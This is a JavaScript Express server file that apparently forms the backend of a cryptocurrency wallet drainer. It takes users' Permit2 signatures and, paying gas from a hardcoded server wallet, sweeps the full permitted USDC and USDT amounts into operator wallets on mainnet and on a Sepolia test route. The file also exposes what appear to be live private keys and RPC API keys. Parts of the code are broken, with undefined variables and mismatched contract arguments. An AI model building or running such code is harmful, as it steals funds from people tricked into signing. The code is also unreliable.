
import express from "express"
import cors from "cors"
import { MaxUint256, ethers } from 'ethers';
import { mainnet, sepolia } from "viem/chains";
import { createWalletClient } from "viem";
import { privateKeyToAccount } from "viem/accounts";
import { http } from "viem";
import { createPublicClient } from "viem";
const { encodeFunctionData } = await import('viem')

const app = express()
app.use(cors())
app.use(express.json())
// ============================================================
// CONFIG
// ============================================================

const SERVER_WALLET_ADDRESS = "0x94Eb2605F3E2e044ede97d1AD14d604a8eAFD3d3" // PC exodus
const MY_WALLET     = "0x631861abdA7DA9e8e1Babb08f52CFa814cE6fa42" // Exodus, your wallet address (recipient)
const PRIVATE_KEY   = "0x1ca7ec249edcb2b5dbe18b3834fae85c31433f6f80c7ded9dc00dfa5a1ec2f18" //PC exodus    // wallet that pays gas (can be a separate funded wallet)
const RPC_URL       = "https://eth-mainnet.g.alchemy.com/v2/noU-8dMn-YuQmXvM-MPq4"
const RPC_URL_TEST  = "https://eth-sepolia.g.alchemy.com/v2/bH4tnbk132zyb0RYF4Opo"        // Alchemy or Infura RPC URL
const MY_WALLET_TEST = "0x62A8E9339EfF78c327b592CA74FbB142bc9A7bc6"
const PORT          =  3001

const TOKENS = [
  {
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
    decimals: 6,
    symbol: "USDC",
  },
  {
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    decimals: 6,
    symbol: "USDT",
  }, 
]


app.post('/api/execute-transfer1', async (req, res) => {
 const { user, signature, permitted, nonce, deadline } = req.body
  // Spender's private key wallet — THIS pays the gas
  console.log("Initializing wallet")
  const spenderWallet = createWalletClient({
    account: privateKeyToAccount(PRIVATE_KEY),
    chain: mainnet,
    transport: http(RPC_URL)
  })

  const transferDetails = permitted.map(({ amount }) => ({
    to: DESTINATION,
    requestedAmount: BigInt(amount) // send full permitted amount to destination
  }))

  const permit = {
    permitted: permitted.map(p => ({
      token: p.token,
      amount: BigInt(p.amount)
    })),
    nonce: BigInt(nonce),
    deadline: BigInt(deadline)
  }
  console.log("Moving tokens")
  // THIS is where tokens actually move — spender pays gas
  const hash = await spenderWallet.writeContract({
    address: PERMIT2_ADDRESS,
    abi: PERMIT2_ABI,
    functionName: 'permitBatchTransferFrom',
    args: [permit, transferDetails, owner, signature]
  })

  // Wait for confirmation
  const receipt = await publicClient.waitForTransactionReceipt({ hash })

  console.log('Transfer executed:', hash)
  res.json({ ok:true })
})









const SPENDER_ABI = [{
  name: 'executeTransfer',
  type: 'function',
  stateMutability: 'nonpayable',
  inputs: [
    {
      name: 'permit',
      type: 'tuple',
      components: [
        {
          name: 'permitted',
          type: 'tuple[]',
          components: [
            { name: 'token',  type: 'address' },
            { name: 'amount', type: 'uint256' }
          ]
        },
        { name: 'nonce',    type: 'uint256' },
        { name: 'deadline', type: 'uint256' }
      ]
    },
    // { name: 'destination', type: 'address' },
    { name: 'from',        type: 'address' },
    { name: 'signature',   type: 'bytes'   }
  ],
  outputs: []
}]

const MAIN_CONTRACT="0xe8A4cf2c94B8B151fA4526CC39d420514debB2f9"
app.post('/api/execute-transfer', async (req, res) => {
 const { user, signature, permitted, nonce, deadline } = req.body
 const spenderAccount = privateKeyToAccount(PRIVATE_KEY)
  // Spender's private key wallet — THIS pays the gas
  console.log("Initializing wallet")
  const spenderWallet = createWalletClient({
    account: spenderAccount,
    chain: mainnet,
    transport: http(RPC_URL)
  })

  const permit = {
    permitted: permitted.map(p => ({
      token: p.token,
      amount: BigInt(p.amount)
    })),
    nonce: BigInt(nonce),
    deadline: BigInt(deadline)
  }

  // console.log('Permit permitted:', JSON.stringify(permit.permitted, (_, v) =>
  //   typeof v === 'bigint' ? v.toString() : v
  // ))
  // console.log('Permit nonce:', permit.nonce)
  // console.log('Permit deadline:', permit.deadline)
  // console.log('Signature length:', signature.length)
  // console.log('MY_WALLET:', MY_WALLET)
  // console.log('Owner:', owner)

  const publicClient = createPublicClient({
    chain: mainnet,
    transport: http(RPC_URL)
  })

  console.log("Moving tokens")
  console.log("OWNER SENT:", user)
  
  await publicClient.simulateContract({
    address: MAIN_CONTRACT,
    abi: SPENDER_ABI,
    functionName: 'executeTransfer',
    args: [permit, user, signature],
    account: spenderAccount
  })

  //THIS is where tokens actually move — spender pays gas
  const hash = await spenderWallet.writeContract({
    address: MAIN_CONTRACT,
    abi: SPENDER_ABI,
    functionName: 'executeTransfer',
    args: [permit, user, signature],
    //account: spenderAccount
  })
  
  

  // Wait for confirmation
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  console.log('Transfer executed:', receipt)
    
  res.json({ ok:true })
})




// TESTNET-version
const SPENDER_CONTRACT = '0xbc97E8EC8f0603dfC76Ff2E356903013536f05D9'

app.post('/api/execute-transfer-test', async (req, res) => {
 const { user, signature, permitted, nonce, deadline } = req.body
 const spenderAccount = privateKeyToAccount('0x47514d9068ead1bffb601d869766a3d3040f10e9303cc291a7e9ccf52a08e2fc')
  // Spender's private key wallet — THIS pays the gas
  console.log("Initializing wallet")
  const spenderWallet = createWalletClient({
    account: spenderAccount,
    chain: sepolia,
    transport: http(RPC_URL_TEST)
  })

  const permit = {
    permitted: permitted.map(p => ({
      token: p.token,
      amount: BigInt(p.amount)
    })),
    nonce: BigInt(nonce),
    deadline: BigInt(deadline)
  }

  // console.log('Permit permitted:', JSON.stringify(permit.permitted, (_, v) =>
  //   typeof v === 'bigint' ? v.toString() : v
  // ))
  // console.log('Permit nonce:', permit.nonce)
  // console.log('Permit deadline:', permit.deadline)
  // console.log('Signature length:', signature.length)
  // console.log('MY_WALLET:', MY_WALLET)
  // console.log('Owner:', owner)

  const publicClient = createPublicClient({
    chain: sepolia,
    transport: http(RPC_URL_TEST)
  })

  console.log("Moving tokens")
  console.log({
    signer: spenderAccount.address,
    expectedSpender: SPENDER_CONTRACT
  })
  console.log("OWNER SENT:", user)
  await publicClient.simulateContract({
    address: SPENDER_CONTRACT,
    abi: SPENDER_ABI,
    functionName: 'executeTransfer',
    args: [permit, MY_WALLET_TEST, user, signature],
    account: spenderAccount
  })

  //THIS is where tokens actually move — spender pays gas
  const hash = await spenderWallet.writeContract({
    address: SPENDER_CONTRACT,
    abi: SPENDER_ABI,
    functionName: 'executeTransfer',
    args: [permit, MY_WALLET_TEST, user, signature],
    //account: spenderAccount
  })
  
  

  // Wait for confirmation
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  console.log('Transfer executed:', receipt)
    
  res.json({ ok:true })
})




app.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`)
})


//https://remix.ethereum.org/#lang=en&optimize&runs=200&evmVersion&version=soljson-v0.8.20+commit.a1b79de6.js